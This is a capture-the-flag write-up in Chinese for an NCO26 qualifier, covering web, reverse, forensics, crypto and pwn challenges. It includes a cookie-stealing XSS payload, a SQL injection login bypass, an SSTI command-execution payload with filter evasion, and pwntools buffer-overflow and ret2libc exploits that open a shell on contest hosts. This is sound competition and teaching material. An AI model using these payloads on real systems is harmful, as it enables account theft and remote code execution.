# ZianTT-NCO26入围测试-Writeup

## 选手/队伍信息

姓名：[REDACTED]

准考证号：[REDACTED]

手机：[REDACTED]

总分：455

排名：1

解题数：28


## Web

### Web-入门夺旗-超级无敌保险箱

`Command + Option + I` 或 `view-source:` 查看源代码

![](<pics/CleanShot 2026-04-19 at 16.35.53@2x.png>)

### Web-简单夺旗-校园表白墙

使用payload：

```html
<script>fetch("/steal?data="+document.cookie)</script>
```

![](<pics/CleanShot 2026-04-19 at 16.37.56@2x.png>)


### Web-简单夺旗—EasyLogin

sql注入，使用万能密码

```
1' or ''='
```

![alt text](<pics/CleanShot 2026-04-19 at 16.39.07@2x.png>)

### Web-中等夺旗-个性签名生成器

SSTI，简单fuzz黑名单，使用Fenjing生成payload

```python
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "globals", "os", "popen"
    ]
    return all(word not in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "ls /")

    print(f"{shell_payload=}")
```

得到 payload：

```
{{(cycler.next['__g''lobals__']['o''s']['p''open']('ls /')).read()}}
```

使用`env`命令获取flag

## Reverse

### Rev-入门夺旗-unzip

？这不是misc吗，怎么reverse了

```python
# unzip attachments.zip
import os

for _ in range(100):
    import zipfile
    with zipfile.ZipFile('attachment.zip', 'r') as zip_ref:
        zip_ref.extractall('./attachments')
    os.remove('attachment.zip')
    os.rename('./attachments/attachment.zip', './attachment.zip')
```

忘了多少层了，报错了就是结束了，去attachments找就行了

### Rev-简单夺旗-bitdance

分析进入主函数跟踪到`sub_11B4`

![](<pics/CleanShot 2026-04-19 at 16.46.54@2x.png>)

做了两次xor，一个是密文和密钥的xor，还有一个是状态值的xor，状态值来自这里

```c
LOBYTE(v7) = __ROL1__(v6, v4 - (v4 / 5 + (((0xCCCCCCCCCCCCCCCDLL * (unsigned __int128)v4) >> 64) & 0xFC)));
```

可得逆向rol1的函数：
```python
def reverse_rol1(v, n):
    n &= 7
    return ((v >> n) | (v << (8 - n))) & 0xFF
```

```python
byte_2060 = [int(x, 16) for x in "13 37 C0 DE 42 99 AA 55".split()]
byte_2040 = [int(x, 16) for x in "07 E8 4C 9D A5 1D D1 14 B2 C8 CB 5D 0B 78 FA 75 BE 4E 12 7E 88 8D 5E 7D 3B C6 3F EC 0D 11 D3 50".split()]

def reverse_rol1(v, n):
    n &= 7
    return ((v >> n) | (v << (8 - n))) & 0xFF

def solve():
    state = 0x5A
    flag = ""
    for i in range(32):
        reverse_rol1_val = reverse_rol1(byte_2040[i], i%5)
        t = state ^ reverse_rol1_val
        ch = t ^ byte_2060[i & 7]
        flag += chr(ch)
        state = reverse_rol1_val ^ byte_2040[i]
    return flag

if __name__ == "__main__":
    print(solve())
```

### Rev-简单夺旗-pygloom

进去看到最后是一个exec，我们把exec改成print提取出执行的源码

```python
_Q = [[57, 57, 57, 57, 70, 70, 70, 70, 57, 57, 57, 57, 57, 57, 57, 57, 70, 70, 70, 70, 70, 70, 70, 70, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57, 57], [57, 57, 57, 54, 57, 70, 70, 57, 69, 70, 70, 57, 57, 70, 70, 54, 57, 70, 70, 70, 70, 54, 57, 54, 70, 70, 70, 57, 57, 70, 70, 70, 70, 57, 57, 70, 70, 70, 70, 57, 70, 70, 70, 57], [57, 57, 54, 57, 54, 70, 54, 57, 54, 57, 54, 57, 54, 57, 54, 57, 54, 57, 70, 70, 54, 57, 54, 57, 70, 70, 57, 69, 54, 57, 70, 70, 57, 69, 54, 57, 70, 70, 57, 121, 70, 70, 57, 69], [57, 54, 57, 70, 70, 70, 70, 54, 57, 54, 70, 54, 57, 54, 57, 54, 70, 54, 57, 54, 57, 54, 57, 54, 70, 54, 57, 54, 57, 54, 70, 54, 57, 54, 57, 54, 57, 54, 57, 54, 57, 54, 57, 54], [54, 70, 54, 57, 57, 57, 57, 69, 70, 70, 53, 57, 54, 69, 70, 70, 70, 70, 54, 70, 54, 69, 70, 70, 70, 70, 54, 69, 70, 70, 70, 70, 54, 70, 54, 57, 54, 70, 54, 57, 54, 70, 54, 57], [57, 57, 57, 57, 57, 57, 54, 70, 70, 70, 70, 54]]
_R = [90, 118, 107, 107, 124, 122, 109]
_S = [77, 107, 96, 57, 120, 126, 120, 112, 119]
_T = [127, 117, 120, 126, 39, 57]
TARGET = [125, 119, 138, 22, 33, 107, 109, 123, 60, 154, 73, 170, 192, 94, 179, 190, 182, 125, 206, 140, 144, 149, 157, 254, 20, 177, 246, 26, 200, 55, 48, 224, 229, 233, 62, 67]

_V = lambda xs: ''.join(chr(x ^ 0x19) for x in xs)
BANNER='\n'.join(_V(x) for x in _Q)

def _W(text: str) -> list[int]:
    return [(((ord(ch) ^ 0x33) + index * 7) & 0xFF) for index, ch in enumerate(text)]


def main() -> None:
    print(BANNER)
    user = input(_V(_T)).strip()
    print(_V(_R) if _W(user) == TARGET else _V(_S))


if __name__ == "__main__":
    main()
```

主要在`_W`函数中，输入的字符串经过了一个简单的变换和目标值比对，写脚本逆推即可

```python
TARGET = [125, 119, 138, 22, 33, 107, 109, 123, 60, 154, 73, 170, 192, 94, 179, 190, 182, 125, 206, 140, 144, 149, 157, 254, 20, 177, 246, 26, 200, 55, 48, 224, 229, 233, 62, 67]
DECODED = ''.join([chr(((num - index * 7) ^ 0x33) & 0xFF) for index, num in enumerate(TARGET)])
print(DECODED)
```

### Rev-中等夺旗-traceweaver

做了个简单的静态反分析

![](<pics/CleanShot 2026-04-19 at 16.54.41@2x.png>)

这里跳到了无效地址让程序无法分析，把这里nop掉重新分析即可

![](<pics/CleanShot 2026-04-19 at 16.56.15@2x.png>)

main函数长这样，分析`sub_1500`注意到是个RC4加密，不难从main函数中定位data中找到密文和key，丢进cyberchef解密即可

![](<pics/CleanShot 2026-04-19 at 16.57.46@2x.png>)

## Forensics

### Forensics-入门夺旗-回响

MorseCode，硬听或者放进频谱软件（Audacity也行，但是我找不到了，用的剪映）提取morsecode丢进cyberchef即可，包裹flag头提交

```
-- ----- .-. ... ...-- -.-. ----- -.. ...-- -... ...-- . .--.
```

### Forensics-简单夺旗-残像

PNG宽高，尝试修改高度到400可以打开（CRC需要同步修改，文件内的是800*200时的值，部分软件可能无法打开，但是stegsolve可以）

提示使用openstego解密，密码也在图片上，使用Windows虚拟机解密后得到flag

### Forensics-简单夺旗-暗流

pcap分析后，先看http请求，发现这人在看一些dns的事

![](<pics/CleanShot 2026-04-19 at 17.05.46@2x.png>)

分析dns流量，发现多个异常dnslog请求

![](<pics/CleanShot 2026-04-19 at 17.06.23.png>)

提取合并后

```
4e434f32367b444e
535f337866316c5f
443474345f4c3334
6b7d
```

hex解密即为Flag

### Forensics-中等夺旗-碎影

R-Studio分析，在第一个分区提取到了一个SECRET~1.txt

```
Foothold-Load9-clive-Bong-Flaring-Rudder3-Texan
```

同时在 DeletedPart 找到一个 flag.zip

![](<pics/CleanShot 2026-04-19 at 17.10.59@2x.png>)

尝试使用密码解压后成功获取flag.txt

```
TkNPMjZ7R2gwc3RfUDRydDF0MTBuX0Qxc2tfRjByM25zMWNzfQ==
```

base64解密即为Flag

## Crypto

### Crypto-入门夺旗-ROT13

丢进CyberChef ROT13解密即可

### Crypto-简单夺旗-AECBS

通过哈希对照，恢复`flag_key`，然后用同密钥新建ECB的AES对象解密`flag_enc`即可得到flag

```python
rom hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

with open("output.txt", 'r') as f:
    lines = [line.strip() for line in f if line.strip()]

mapping = {}
flag_cipher_line = "2237a82d5dd03dbf1fc349631aedee12ee65d1bf600c06b8a879bb5e48a0fbec35dd7e2e3d9e630733b4215eac5e1c86"

for line in lines:
    if ':' in line:
        key, commitment = line.split(': ')
        mapping[commitment] = key

keys = []
for commitment in lines[-25:-1]:
    keys.append(mapping[commitment])
flag_key = md5(''.join(keys).encode()).digest()
cipher = AES.new(flag_key, AES.MODE_ECB)
flag_ciphertext = bytes.fromhex(flag_cipher_line)
flag = cipher.decrypt(flag_ciphertext)
flag = unpad(flag, AES.block_size).decode()
print(flag)
```

### Crypto-简单夺旗-EasyRSA

> 以下内容由赛方提供的Qwen-35B提供

已知 b = q - p * a  => q = b + p * a

我们需要先求出 p。

已知 N = p * q，代入 q:

N = p * (b + p * a) = p * b + p^2 * a

整理得关于 p 的二次方程：

a * p^2 + b * p - N = 0

使用求根公式：p = (-b ± sqrt(b^2 + 4*a*N)) / (2*a)

因为 p > 0，取正根：p = (-b + sqrt(b^2 + 4*a*N)) / (2*a)

> 脚本也是

```python
from Crypto.Util.number import *
N = 148666668901185149784739478682308085031070000573190964929846359729557031301257786817700147367909473870217872624619758551089634172807786042111231949827706121655593546974471452914582555458855027458403632206450615776721817956949762497575275711053962229677111371131877490250365778453469462722322752855184462398976891065905440873214980607128553300034332822964969751743093843256116041027691009994855864788476844516179709933258985196118188246330043408811343933051941542658758381985619765001562252847642583346911608349544355562439693735071817897271
e = 65537
c = 80733770954991031668775622517231524063135544429382678979155548212271993847036011861504906642935092012240449392852312141206421780321060051676553541220002781207916766820356967470336963048627073107983588915135057845189618997523881592167249262432455387047459628530391154098890257785793094403466662334354339148998435348807754512576518948168270500052718609098878932560033251323305063038410882433143674412573012645547078970628782424576394997055361411758511792294140744561606464911423564239306148199368061491373800123370290935140876297979361534876
a = 76214568685157087609968231616468251837651940797006426085670701172376407339739
b = 68043272436639493421471408932946687449725726905574698616760571272455553592089400728325298072744421960043614254574642282873705109931229245521117772211228595363982975967508122942372410596238639794500066066051414038482087746299902908156159783809916564691661908410696718626743434206197673506594796512193581881468

import math
from gmpy2 import isqrt, invert

discriminant = b**2 + 4 * a * N
sqrt_disc = isqrt(discriminant)
if sqrt_disc * sqrt_disc != discriminant:
    raise ValueError("Discriminant is not a perfect square")

p = (-b + sqrt_disc) // (2 * a)

q = (b + p * a)
assert p * q == N, "Calculated p and q do not match N"

phi = (p - 1) * (q - 1)
d = invert(e, phi)
m = pow(c, d, N)

print(long_to_bytes(m))
```

### Crypto-中等夺旗-MatCipher

> 以下内容由赛方提供的Qwen-35B提供

```python
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Util.number import *


cipher = [208, 160, 93, 228, 196, 183, 1, 205, 121, 159, 158, 53, 212, 28, 135, 217]
flag_cipher_hex = "7d8b14bf8944d5bcb77ee36bdc16edb69e7ed585ea3ba35cee4008bbef1c997536b5faf1b699fd6a9acce6aef636dfd6"


messages_str = b"The staircase borrowed a whisper from tomorrow,folded it into a paper moon, and quietly forgot why the clouds were wearing shoes"
Zp = Zmod(257)
messages = list(messages_str)
assert len(messages) % 8 == 0
n_blocks = len(messages) // 8


M = []
for i in range(n_blocks):
    block = messages[i*8 : (i+1)*8]
    M.append([Zp(x) for x in block])

C = [Zp(x) for x in cipher]

M8 = matrix(Zp, M[:8])
C8 = vector(Zp, C[:8])
key = M8.solve_right(C8)
print("Recovered key (mod 257):", key)

# key = [79, 170, 244, 185, 229, 201, 71, 79]

key_bytes = bytes([int(x) for x in key])

aes = AES.new(md5(key_bytes).digest(), AES.MODE_ECB)
flag_cipher = bytes.fromhex(flag_cipher_hex)
flag = unpad(aes.decrypt(flag_cipher), 16)
print("Flag:", flag.decode())
```

## Pwn

### PWN-入门夺旗-parrotbooth

溢出，nc上去多按几个键就行了

### PWN-简单夺旗-史莱姆实验室

给了源码，那爽了

注意到

```c

typedef struct {
    char codename[24];
    char slogan[16];
    unsigned int stickers;
    unsigned int judge_code;
} slime_profile_t;

static void rename_slime(void)
{
    puts("\nGive your slime a dramatic codename.");
    puts("The teacher says long names look cooler on the big screen.");
    printf("> ");

    read_line(profile.codename, 64);

    puts("The machine updates your slime badge.");
}
```

codename 只有 24 字节，但允许写入 64 字节，存在缓冲区溢出，可以覆盖 slogan stickers judge_code。

其中，`golden_recipe` 的条件是 `profile.judge_code == GOLDEN_CODE`，`profile.stickers < 3`。

```c
#define GOLDEN_CODE 0x52415453u
```

构建payload，编写exp
```python
from pwn import *
io = remote("chal.thuctf.redbud.info", 34733)

GOLDEN_CODE = 0x52415453 

payload  = b"A" * 24
payload += b"A" * 16
payload += p32(1)
payload += p32(GOLDEN_CODE)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"> ", payload)
io.sendlineafter(b"> ", b"4")

io.interactive()
```

### PWN-简单夺旗-超级无敌扭蛋机

```c
char battle_cry[32];

read(STDIN_FILENO, battle_cry, 96);
```

依旧溢出，依旧backdoor

```python
from pwn import *

payload  = b'A' * 32 + b'A' * 8
payload += p32(0x4012e0) # bonus_mode

io = remote("chal.thuctf.redbud.info", 34922)

io.sendafter(b'> ', payload)
io.interactive()
```

### PWN-中等夺旗-食堂点餐系统

赛后光速让Agent摸了个exp，我不懂啊（

```python
from pwn import *

context.binary = elf = ELF("cafeteria-terminal")
libc = ELF("libc-2.31.so")

context.arch = "amd64"

OFFSET = 72

POP_RDI_RET = 0x4011FA
RET = 0x40120F

io = remote("chal.thuctf.redbud.info", 35003)

io.recvuntil(b"Do you want to check the live pickup queue screen? (y/n)")
io.recvuntil(b"> ")
io.sendline(b"y")
io.recvuntil(b"Type a short preview note for the screen.")
io.recvuntil(b"> ")
io.send(b"A" * 0x20)

io.recvuntil(b"The preview printer sputters and dumps extra bytes:\n")
leak = io.recvn(0x28)
stdout_leak = u64(leak[-8:])
libc.address = stdout_leak - libc.sym["_IO_2_1_stdout_"]
log.success(f"stdout@libc: {hex(stdout_leak)}")
log.success(f"libc base: {hex(libc.address)}")

io.recvuntil(b"Enter a short note for the advance pickup printer.")
io.recvuntil(b"> ")

binsh = next(libc.search(b"/bin/sh\x00"))
payload = flat(
    b"A" * OFFSET,
    RET,
    POP_RDI_RET,
    binsh,
    libc.sym["system"],
    libc.sym["exit"],
)
io.send(payload)

io.interactive()
```